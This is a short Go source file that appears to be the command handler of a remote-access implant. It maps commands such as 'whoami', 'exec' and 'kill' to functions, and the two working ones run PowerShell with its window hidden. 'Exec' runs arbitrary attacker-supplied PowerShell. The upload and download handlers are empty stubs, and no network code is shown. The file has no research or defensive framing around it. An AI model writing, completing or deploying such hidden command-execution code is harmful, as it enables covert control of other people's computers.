package internal

import (
	"os"
	"os/exec"

	"syscall"
)

type FuncPtr func([]string) ([]byte, error)

var FuncPtrMap = map[string]FuncPtr{
	"whoami": Whoami,
	"exec":   Exec,
	"kill":   Kill,
}

func Whoami(args []string) ([]byte, error) {
	cmd := exec.Command("powershell", "-C", "whoami")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd.CombinedOutput()
}

func Exec(args []string) ([]byte, error) {
	cmdArgs := append([]string{"-C"}, args...)
	cmd := exec.Command("powershell", cmdArgs...)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd.CombinedOutput()
}

func Upload(args []string) ([]byte, error) {
	return nil, nil
}

func Download(args []string) ([]byte, error) {
	return nil, nil
}

func Kill(args []string) ([]byte, error) {
	os.Exit(0)
	return nil, nil
}
